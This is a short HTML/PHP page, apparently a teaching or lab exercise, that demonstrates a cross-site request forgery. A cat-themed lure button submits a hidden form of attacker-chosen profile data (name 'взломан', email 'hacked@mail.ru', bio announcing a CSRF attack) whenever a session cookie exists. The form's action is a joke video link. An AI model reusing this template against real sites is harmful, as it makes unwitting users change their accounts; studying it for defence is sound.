<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
        <meta name="viewport" content="width=device-width">
        <title>Всем котиков</title>
    </head>
    <body>
        <form method="post" action="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
            <div class="form-group" style="display:none;">
                    <input type="text" name="name" value="взломан">
                    <input type="tel" name="phone" value="+7 (900) 000-000-000">
                    <input type="text" name="email" value="hacked@mail.ru">
                    <select id="year" name="year">
                        <option selected>1912</option>
                    </select>
                    <input type="radio" value="M" name="gender" checked>
                    <textarea name="bio" >Произошла CSRF атака!</textarea>
                    <input type="checkbox" name="checkbox" value="checkbox" checked></p>
            </div>
            <?php if(!empty($_COOKIE[session_name()]) ) print('<p><button type="submit" >Нажми, чтобы погладить!</button></p>');?>
            <p><img src="https://www.factroom.ru/wp-content/uploads/2021/12/4-19.jpg" width="500px" height="40%"></p>
        </form>
    </body>
</html>
